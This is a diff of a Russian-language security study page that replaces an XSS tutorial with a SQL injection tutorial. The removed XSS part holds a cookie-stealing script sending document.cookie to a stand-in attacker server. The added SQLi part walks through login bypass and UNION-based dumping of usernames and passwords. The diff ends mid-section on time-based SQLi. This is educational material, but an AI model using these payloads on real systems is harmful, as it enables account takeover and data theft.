@@ -12,20 +12,20 @@
         <meta name="author" content="Dmitrii Ivanov">
       
       
-        <link rel="canonical" href="https://ivanovds.ru/CyberSec/CyberSec_Frameworks/OWASP/Cross_site_scripting_%28XSS%29/">
+        <link rel="canonical" href="https://ivanovds.ru/CyberSec/CyberSec_Frameworks/OWASP/SQLi/">
       
       
-        <link rel="prev" href="../Broken_Authentication/">
+        <link rel="prev" href="../SSRF/">
       
       
-        <link rel="next" href="../Injection/">
+        <link rel="next" href="../XML_External_Entity_%28Security_misconfiguration%29/">
       
       <link rel="icon" href="../../../../images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.0">
     
     
       
-        <title>Cross Site Scripting - ivanovds.ru</title>
+        <title>SQL Injections - ivanovds.ru</title>
       
     
     
@@ -89,7 +89,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#cross-site-scripting-xss" class="md-skip">
+        <a href="#sql-injection" class="md-skip">
           Перейти к содержанию
         </a>
       
@@ -123,7 +123,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Cross Site Scripting
+              SQL Injections
             
           </span>
         </div>
@@ -776,80 +776,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Cross Site Scripting
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../Cross_site_scripting_%28XSS%29/" class="md-nav__link">
         Cross Site Scripting
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Содержание раздела">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Содержание раздела
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#1-stored-xss" class="md-nav__link">
-    1. Stored XSS
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#2-reflected-xss" class="md-nav__link">
-    2. Reflected XSS
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#3-dom-based-xss" class="md-nav__link">
-    3. DOM-based XSS
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#xss" class="md-nav__link">
-    Практические примеры XSS
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#xss_1" class="md-nav__link">
-    Рекомендации по поиску XSS
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -929,11 +860,80 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../SQLi/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          SQL Injections
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         SQL Injections
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Содержание раздела">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание раздела
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#in-band-sql-injection" class="md-nav__link">
+    In-Band SQL Injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#union-based-sql-injection" class="md-nav__link">
+    Union-Based SQL Injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#boolean-based-sqli" class="md-nav__link">
+    Boolean Based SQLi
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#time-based-sqli" class="md-nav__link">
+    Time-Based SQLi
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqli" class="md-nav__link">
+    Способы устранения возможности использования SQLi
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -2249,36 +2249,36 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#1-stored-xss" class="md-nav__link">
-    1. Stored XSS
+  <a href="#in-band-sql-injection" class="md-nav__link">
+    In-Band SQL Injection
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#2-reflected-xss" class="md-nav__link">
-    2. Reflected XSS
+  <a href="#union-based-sql-injection" class="md-nav__link">
+    Union-Based SQL Injection
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#3-dom-based-xss" class="md-nav__link">
-    3. DOM-based XSS
+  <a href="#boolean-based-sqli" class="md-nav__link">
+    Boolean Based SQLi
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#xss" class="md-nav__link">
-    Практические примеры XSS
+  <a href="#time-based-sqli" class="md-nav__link">
+    Time-Based SQLi
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#xss_1" class="md-nav__link">
-    Рекомендации по поиску XSS
+  <a href="#sqli" class="md-nav__link">
+    Способы устранения возможности использования SQLi
   </a>
   
 </li>
@@ -2298,51 +2298,141 @@
                   
 
 
-<h1 id="cross-site-scripting-xss">Cross site scripting (XSS)</h1>
-<hr />
-<p>Тип инъекций который вызывает выполнение внедренного кода на языках JS, VBS, Flash и CSS.
-Так же как и XEE, XSS имеет место быть в тех web приложениях где пользовательский ввод обрабатывается в чистом виде.
-Различают следующие основные применения XSS payload:</p>
-<ol>
-<li>Вызов popup окон  через функцию <code>alert()</code></li>
-<li>Изменение HTML/DOM объектов на странице через <code>document.write</code></li>
-<li>XSS keylogger</li>
-<li>Port scanning</li>
-</ol>
-<p>Различают несколько видов XSS:</p>
-<h3 id="1-stored-xss">1. Stored XSS</h3>
-<p><img alt="" src="/images/XSS.png" /></p>
-<p>Самый коварный тип XSS.<br />
-Для реализации нет необходимости взаимодействия с пользователем.<br />
-Сохраняет внедренный код в БД приложения, таким образом этот код выполняется при каждом открытии страницы пользователями.</p>
-<h3 id="2-reflected-xss">2. Reflected XSS</h3>
-<p><img alt="" src="/images/XSS_1.png" /></p>
-<p>Самый часто используемый тип XSS.<br />
-В отличии от stored XSS, вредоносный код в reflected XSS является частью запроса пользователя. Следовательно для реализации атаки, нужно заставить пользователя воспользоватся ссылкой.</p>
-<h3 id="3-dom-based-xss">3. DOM-based XSS</h3>
-<p><img alt="" src="/images/XSS_2.png" /></p>
-<p>В отличии от reflected XSS внедренный код не выполняется сразу, а запускается только при обработке определенного элемента на странице. Оттуда и название которое говорит о том, что инъекция привязывается к DOM объекту.</p>
-<h3 id="xss">Практические примеры XSS</h3>
-<ol>
-<li><strong>Кража пользовательских cookies (stored XSS).</strong><ol>
-<li>Атакающий разворачивает подконтрольный ему http сервер. Можно использовать
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span>
-</span></code></pre></div></li>
-<li>На страницу целевого приложения внедряется следующий JS код: 
-<div class="language-JavaScript highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span><span class="nx">windows</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://attacker_server/?cookie=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
-</span></code></pre></div></li>
-<li>Атакующему летят GET запросы с cookie.</li>
-<li>Profit!</li>
-</ol>
+<h1 id="sql-injection">SQL Injection</h1>
+<p>Также известная как SQLi - уязвимость заключающаяся в передаче злонамеренного SQL запроса в БД. Как правило, для SQL Injection легитимный запрос к БД редактируется таким образом, что путем добавления в запрос управляющих конструкций SQL, он превращается в злонамеренный. </p>
+<div class="admonition warning">
+<p class="admonition-title">Обрати внимание</p>
+<p>Для изучения возможности использования SQLi в форму достаточно отправить <code>'</code> </p>
+</div>
+<p>Различают несколько типов SQLi:</p>
+<ul>
+<li>
+<p><strong>In-Band SQLi</strong> - Самый простой для нахождения и реализации тип уязвимости. Отличительной особенностью является то, что взаимодействие с БД, происходит напрямую, а результат такого взаимодействия виден сразу.</p>
 </li>
-<li><strong>Пример показывающий, что в качестве payload могут выступать и html теги:</strong> 
-<div class="language-HTML highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;javascript:alert(`xss`)&quot;</span><span class="p">&gt;</span>
-</span></code></pre></div></li>
+<li>
+<p><strong>Error-Based SQLi</strong> - Основан на анализе ошибок отдаваемых СУБД в процессе выполнения запросов. </p>
+</li>
+<li>
+<p><strong>Union-Based SQLi</strong> - Предстваляет из себя расширение In-Band типа с использованием команды <code>UNION</code>.</p>
+</li>
+<li>
+<p><strong>Blind-SQLi</strong> - Тип уязвимостей при котором в отличии от In-Band SQLi явно не отображается результат взаимодействия с БД.</p>
+</li>
+<li>
+<p><strong>Boolean Based SQLi</strong> - Подтип уязвимостей Blind-SQLi при котором ответом на запрос является только true или false </p>
+</li>
+<li>
+<p><strong>Time-Based SQLi</strong>- Подтип уязвимостей Blind-SQLi при котором индикатором корректного выполнения запроса является время его исполнения. Для этого используется функция <code>SLEEP()</code> </p>
+</li>
+</ul>
+<p>Подробнее ниже или на странице <a href="/Technologies/MySQL">MySQL</a></p>
+<h3 id="in-band-sql-injection">In-Band SQL Injection</h3>
+<p>Рассмотрим пример: аутентификация пользователей выполняется с помощью следующего запроса:</p>
+<p><div class="language-SQL highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;%username%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;%password%&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</span></code></pre></div>
+В таком случае, если в поле <code>password</code> записать <code>' OR 1=1; --</code>, можно будет обойти проверку валидности пароля, так как кавычка в начале строки, эквивалентна вводу пустого пароля, условие 1=1 выполняется всегда, а символ <code>--</code> являющийся обозначением начала комментария, просто отсечет остальную часть запроса:</p>
+<div class="language-SQL highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="c1">--&#39; LIMIT 1;</span>
+</span></code></pre></div>
+<p>Другой пример: Представим, что web приложение получает сведения из БД путем запроса:
+<div class="language-SQL highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">article</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="n">id_num</span><span class="p">;</span>
+</span></code></pre></div></p>
+<p><code>id_num</code> передается в БД через GET запрос <code>https://website.net/article?id=1</code></p>
+<p>В таком случае, простое изменение параметра id откроет нам другую статью.</p>
+<h3 id="union-based-sql-injection">Union-Based SQL Injection</h3>
+<p>Продолжаем работать с web приложением из первого примера:
+<div class="language-SQL highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">article</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="n">id_num</span><span class="p">;</span>
+</span></code></pre></div></p>
+<p>Используя <code>UNION</code> можно попробывать получить доступ к другим таблицам БД. </p>
+<blockquote>
+<p>следует помнить, что основным условием объединения вывода из нескольких таблиц через <code>UNION</code> является одинаковое количество столбцов во всех включаемых в запрос таблицах</p>
+</blockquote>
+<p>Перед тем, как получить сведения из интересующих таблиц, нужно сначала узнать какие вообще таблицы присутствуют в БД. Для получения указанной информации придется подёргать БД:</p>
+<p>Отправим следующий GET запрос:
+<div class="language-Bash highlight"><span class="filename">GET запрос</span><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>https://website.net/article?id<span class="o">=</span><span class="m">1</span><span class="w"> </span>UNION<span class="w"> </span>SELECT<span class="w"> </span><span class="m">1</span>
+</span></code></pre></div>
+Который преобразует легитимный SQL запрос в следующий:
+<div class="language-SQL highlight"><span class="filename">Полученный SQL запрос</span><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">article</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</span></code></pre></div>
+Помня о том, что при использовании <code>UNION</code> количество столбцов должно быть равно, мы скорее всего получим ошибку вида:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>SQLSTATE[21000]: 
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Cardinality violation: 1222 
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>The used SELECT statements have a different number of columns
+</span></code></pre></div>
+Будем увеличивать количество значений после <code>UNION</code> до тех пор, пока не получим вывод без ошибок. Для простоты представим, что в таблице <code>article</code> было всего 3 столбца, тогда:</p>
+<div class="language-Bash highlight"><span class="filename">GET запрос</span><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>https://website.net/article?id<span class="o">=</span><span class="m">1</span><span class="w"> </span>UNION<span class="w"> </span>SELECT<span class="w"> </span><span class="m">1</span>,2,3
+</span></code></pre></div>
+<div class="language-SQL highlight"><span class="filename">Полученный SQL запрос</span><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">article</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span>
+</span></code></pre></div>
+<p>Далее, не получив ошибку, сделаем так, чтобы данные получаемые из таблицы <code>article</code> не отображались, а выводились бы только наш изменённый <code>UNION</code>. Кроме того, теперь мы можем получить название БД:</p>
+<div class="language-Bash highlight"><span class="filename">GET запрос</span><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>https://website.net/article?id<span class="o">=</span><span class="m">0</span><span class="w"> </span>UNION<span class="w"> </span>SELECT<span class="w"> </span><span class="m">1</span>,2,database<span class="o">()</span>
+</span></code></pre></div>
+<div class="language-SQL highlight"><span class="filename">Полученный SQL запрос</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">article</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="k">database</span><span class="p">();</span><span class="w"> </span>
+</span></code></pre></div>
+<p>Получив название БД - <code>DB_NAME</code>, можем получить наименование таблиц. Для этого воспользуемся служебной таблицей <code>information_schema</code> в которой хранятся метаданные БД, а также <code>group_concat()</code> для того, чтобы вывести наименование всех таблиц в одной записи:</p>
+<div class="language-Bash highlight"><span class="filename">GET запрос</span><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>https://website.net/article?id<span class="o">=</span><span class="m">0</span><span class="w"> </span>UNION<span class="w"> </span>SELECT<span class="w"> </span><span class="m">1</span>,2,group_concat<span class="o">(</span>table_name<span class="o">)</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>FROM<span class="w"> </span>information_schema.tables<span class="w"> </span>WHERE<span class="w"> </span><span class="nv">table_schema</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;DB_NAME&#39;</span>
+</span></code></pre></div>
+<div class="language-SQL highlight"><span class="filename">Полученный SQL запрос</span><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">article</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="err">\</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">;</span><span class="w"> </span>
+</span></code></pre></div>
+<p>Получив название таблиц, выберем нужную - <code>staff_users</code> и получим наименование её столбцов:</p>
+<div class="language-Bash highlight"><span class="filename">GET запрос</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>https://website.net/article?id<span class="o">=</span><span class="m">0</span><span class="w"> </span>UNION<span class="w"> </span>SELECT<span class="w"> </span><span class="m">1</span>,2,group_concat<span class="o">(</span>column_name<span class="o">)</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>FROM<span class="w"> </span>information_schema.columns<span class="w"> </span>WHERE<span class="w"> </span><span class="nv">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;staff_users&#39;</span>
+</span></code></pre></div>
+<div class="language-SQL highlight"><span class="filename">Полученный SQL запрос</span><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">article</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="err">\</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;staff_users&#39;</span>
+</span></code></pre></div>
+<p>Далее, располагая всей информацией получим заветные сведения:</p>
+<div class="language-Bash highlight"><span class="filename">GET запрос</span><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>https://website.net/article?id<span class="o">=</span><span class="m">0</span><span class="w"> </span>UNION<span class="w"> </span>SELECT<span class="w"> </span><span class="m">1</span>,2,<span class="se">\</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>group_concat<span class="o">(</span>username,<span class="s1">&#39;:&#39;</span>,password<span class="w"> </span>SEPARATOR<span class="w"> </span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="o">)</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>FROM<span class="w"> </span>staff_users
+</span></code></pre></div>
+<div class="language-SQL highlight"><span class="filename">Полученный SQL запрос</span><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">article</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="err">\</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="n">password</span><span class="w"> </span><span class="n">SEPARATOR</span><span class="w"> </span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">)</span><span class="w"> </span><span class="err">\</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">staff_users</span>
+</span></code></pre></div>
+<h3 id="boolean-based-sqli">Boolean Based SQLi</h3>
+<p>Представим, что легитимный запрос выглядит следующим образом:</p>
+<div class="language-Bash highlight"><span class="filename">GET запрос</span><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>https://website.thm/checkuser?username<span class="o">=</span>admin
+</span></code></pre></div>
+<div class="language-SQL highlight"><span class="filename">Полученный SQL запрос</span><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</span></code></pre></div>
+<div class="language-Bash highlight"><span class="filename">Ответ</span><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="o">{</span>taken:true<span class="o">}</span>
+</span></code></pre></div>
+<p>В случае, если мы передадим неверное имя пользователя, получим <code>{taken:false}</code></p>
+<p>Воспользуемся этим и применим технику с использованием <code>UNION</code>. Будем увеливать количество значений после <code>UNION</code> до тех пор, пока не получим <code>{taken:true}</code>. Для простоты, представим, что столбцов в <code>users</code> всего 3, тогда:</p>
+<p><div class="language-Bash highlight"><span class="filename">GET запрос</span><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>https://website.thm/checkuser?username<span class="o">=</span>test<span class="err">&#39;</span><span class="w"> </span>union<span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="m">1</span>,2,3<span class="p">;</span>--
+</span></code></pre></div>
+<div class="language-SQL highlight"><span class="filename">Полученный SQL запрос</span><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span><span class="c1">--&#39; LIMIT 1</span>
+</span></code></pre></div>
+Далее, необходимо узнать наименование БД. Исходя из того, что получаемые сообщения ограничены true/false, для получения сведений о какой либо сущности в БД, будем использовать <code>LIKE</code> совместно с <code>%</code>, что позволит нам перебирать значения, до тех пор, пока не получим нужное. Предположим, что название БД начинается с буквы, начнём с <code>а</code> и будем изменять её до тех пор, пока не получим <code>{taken:true}</code>:</p>
+<p><div class="language-Bash highlight"><span class="filename">GET запрос</span><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>https://website.thm/checkuser?username<span class="o">=</span>test<span class="s1">&#39; union select 1,2,3 where database() like &#39;</span>a%<span class="err">&#39;</span><span class="p">;</span>--
+</span></code></pre></div>
+<div class="language-SQL highlight"><span class="filename">Полученный SQL запрос</span><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;a%&#39;</span><span class="p">;</span><span class="c1">--&#39; LIMIT 1</span>
+</span></code></pre></div></p>
+<p>Дальнейшие действия понятны - добавляем буквы, цифры, знаки, пока не получим наименование БД. После чего, таким же способом находим таблицы, столбцы, и необходимые значения.</p>
+<h3 id="time-based-sqli">Time-Based SQLi</h3>
+<p>Принцип работы с таким типом SQLi аналогичен Blind-based SQLi и заключается в переборе значений, для поиска верных, однако в качестве индикатора успешности выполнения запроса используется функция <code>SLEEP()</code>, успешно выполненная часть запроса с <code>UNION</code> будет выполнятся определенное количество времени:</p>
